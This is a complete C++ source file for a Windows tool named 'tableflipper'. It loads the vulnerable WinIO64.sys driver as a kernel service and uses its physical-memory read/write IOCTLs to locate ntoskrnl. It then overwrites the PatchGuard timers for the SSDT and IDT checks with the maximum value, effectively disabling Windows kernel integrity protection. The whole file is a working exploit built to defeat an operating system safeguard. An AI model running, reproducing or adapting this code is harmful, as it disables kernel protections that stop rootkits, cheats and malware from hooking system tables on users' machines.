#pragma warning(disable: 4996)
#include <Windows.h>
#include <iostream>
#include <map>

typedef unsigned long u32;
typedef unsigned long long u64;

#define IOCTL_MAP 0x80102040
#define IOCTL_UNMAP 0x80102044

#define PATTERN_SEARCH_RANGE 0xEFFFFF
#define DRIVER_NAME_LEN 16

unsigned char sdt_pg_timed_last_time_pattern[] = { 0x48, 0x3B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x82, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x1D };
unsigned char idt_pg_timed_last_time_pattern[] = { 0x48, 0x3B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x82, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x01, 0x8C };

u64 driver_handle = -1;
char winio_path[FILENAME_MAX];

struct winio_packet
{
	u64 size;
	u64 phys_address;
	u64 phys_handle;
	u64 phys_linear;
	u64 phys_section;
};

u64 phys_map(winio_packet& packet)
{
	u32 bytes_returned;
	if (!DeviceIoControl((void*)driver_handle, IOCTL_MAP, &packet, sizeof(winio_packet), &packet, sizeof(winio_packet), &bytes_returned, NULL))
		return NULL;

	return packet.phys_linear;
}

bool phys_unmap(winio_packet& packet)
{
	u32 bytes_returned;
	if (!DeviceIoControl((void*)driver_handle, IOCTL_UNMAP, &packet, sizeof(winio_packet), NULL, 0, &bytes_returned, NULL))
		return false;

	return true;
}

bool read_phys(u64 addr, u64 buf, u64 size)
{
	winio_packet packet;
	packet.phys_address = addr;
	packet.size = size;

	u64 linear_address = phys_map(packet);
	if (linear_address == NULL)
		return false;

	//printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
	memcpy((void*)buf, (void*)linear_address, size);

	phys_unmap(packet);
	return true;
}


bool write_phys(u64 addr, u64 buf, u64 size)
{
	winio_packet packet;
	packet.phys_address = addr;
	packet.size = size;

	u64 linear_address = phys_map(packet);
	if (linear_address == NULL)
		return false;

	//printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
	memcpy((void*)linear_address, (void*)buf, size);

	phys_unmap(packet);
	return true;
}

u64 find_pattern(u64 start, u64 range, unsigned char* pattern, size_t pattern_length)
{
	u64 buf = (u64)malloc(range);
	read_phys(start, (u64)buf, range);

	u64 result = 0;
	for (int i = 0; i < range; i++)
	{
		bool vtn = true;
		for (int j = 0; j < pattern_length; j++)
		{
			if (vtn && pattern[j] != 0x00 && *(unsigned char*)(buf + i + j) != pattern[j])
			{
				vtn = false;
			}
		}

		if (vtn)
		{
			result = start + i;
			goto ret;
		}
	}

ret:
	free((void*)buf);
	return result;
}

bool file_exists(const std::string path) {
	DWORD v0 = GetFileAttributesA(path.c_str());
	return v0 != -1 && !(v0 & 0x00000010);
}

void load_driver_lazy(const char* driver_name, const char* bin_path)
{
	u64 cmdline_create_buf = (u64)malloc(strlen(driver_name) + strlen(bin_path) + 53);
	u64 cmdline_start_buf = (u64)malloc(strlen(driver_name) + 14);
	sprintf((char*)cmdline_create_buf, "sc create %s binpath=\"%s\" type=kernel>NUL", driver_name, bin_path);
	sprintf((char*)cmdline_start_buf, "sc start %s>NUL", driver_name);
	system((char*)cmdline_create_buf);
	system((char*)cmdline_start_buf);
}

int main(int argc, char* argv[])
{
	printf("[*] tableflipper by emlinhax\n");

LOAD_WINIO:
	printf("[*] attempting to open handle to winio...\n");
	driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (driver_handle == -1)
	{
		GetCurrentDirectoryA(FILENAME_MAX, winio_path);
		strcat(winio_path, "\\WinIO64.sys");

		if (!file_exists(winio_path))
		{
			printf("[!] could not find winio driver.\n[!] please make sure \"WinIO64.sys\" is in the same folder.\n");
			system("pause>NUL");
			return -3;
		}

		//winio driver doesnt unload correctly sometimes. you have to stop it multiple times (?)
		system("sc stop winio_tf >NUL");
		system("sc delete winio_tf >NUL");

		load_driver_lazy("winio_tf", winio_path);
		goto LOAD_WINIO;
	}

	printf("[*] driver_handle: %p\n", driver_handle);

	// ####

	printf("[*] finding ntoskrnl...\n");
	u64 ntos_base_pa = 0;
	for (u64 i = 0x000000000; i < 0x200000000; i += 0x000100000)
	{
		char* buf = (char*)malloc(2);
		read_phys(i, (u64)buf, 2);

		if (buf[0] == 'M' && buf[1] == 'Z')
		{
			ntos_base_pa = i;
			printf("[*] ntoskrnl @ 0x%p\n", ntos_base_pa);
			break;
		}

		free(buf);
	}

	if (!ntos_base_pa)
	{
		printf("[!] could not find ntoskrnl base.\n");
		system("pause>NUL");
		return -5;
	}

	u64 p_sdt_timer_instr = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, sdt_pg_timed_last_time_pattern, sizeof(sdt_pg_timed_last_time_pattern));
	u64 p_idt_timer_instr = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, idt_pg_timed_last_time_pattern, sizeof(idt_pg_timed_last_time_pattern));
	if (p_sdt_timer_instr == 0 || p_idt_timer_instr == 0)
	{
		printf("[!] could not find one or both patterns.\n");
		system("pause>NUL");
		return -6;
	}

	u32 sdt_timer_offset = 0;
	u32 idt_timer_offset = 0;
	read_phys(p_sdt_timer_instr + 3, (u64)&sdt_timer_offset, 4);
	read_phys(p_idt_timer_instr + 3, (u64)&idt_timer_offset, 4);

	printf("[+] sdt_timer @ 0x%p\n", p_sdt_timer_instr + sdt_timer_offset + 7);
	printf("[+] idt_timer @ 0x%p\n", p_idt_timer_instr + idt_timer_offset + 7);

	u64 u64_max = ULLONG_MAX;
	write_phys(p_sdt_timer_instr + sdt_timer_offset + 7, (u64)&u64_max, sizeof(u64));
	write_phys(p_idt_timer_instr + idt_timer_offset + 7, (u64)&u64_max, sizeof(u64));
	printf("[*] patched sdt & idt timer!\n");

	// unload winio driver
	system("sc stop winio_tf >NUL");
	system("sc delete winio_tf >NUL");
	printf("[*] unloaded winio driver.\n");

	printf("[*] done!\n");
	system("pause>NUL");

	return 0;
}
